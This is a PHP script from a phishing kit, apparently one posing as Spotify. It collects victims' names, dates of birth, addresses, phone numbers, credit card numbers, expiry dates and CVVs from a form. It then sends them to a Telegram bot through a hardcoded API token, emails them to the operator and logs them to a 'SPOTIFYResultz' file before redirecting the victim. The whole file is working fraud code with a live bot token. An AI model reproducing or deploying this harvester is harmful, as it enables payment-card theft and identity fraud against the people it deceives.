<?php
require "CONTROLS.php";
require "includes/functions.php";
ini_set('display_errors', 0);




        $date = date('l d F Y');
        $time = date('H:i');
		$FN = $_POST['FN'];
		$DB = $_POST['DB'];
		$AD = $_POST['AD'];
		$CY = $_POST['CY'];
		$ZE = $_POST['ZE'];
		$PH = $_POST['PH'];
		$PQ = $_POST['PQ'];
		$PN = $_POST['PN'];
		$LM = $_POST['LM'];		
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $data = "
+ ------------- 2 PersonalDetails --------------+
| FULLNAME	: $FN
| D.O.B 	: $DB
| ADDRESS   : $AD
| CITY      : $CY
| ZIPCODE   : $ZE
| Phone   : $PH
+ ------Credit Number-----+
| Credit Number   : $PQ
| EXP   : $PN
| CVV   : $LM
+ ------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------created by @JS-----+
";
 file_get_contents("https://api.telegram.org/bot5936014016:AAHBNROC7Nw6ob9M7Ux2t3O8z-FY_JL761k/sendMessage?chat_id=5085418157&text=" . urlencode($data)."" );

        $subject = "SPOTIFYResultz 2 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('SPOTIFYResultz.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "loading.php";

</script>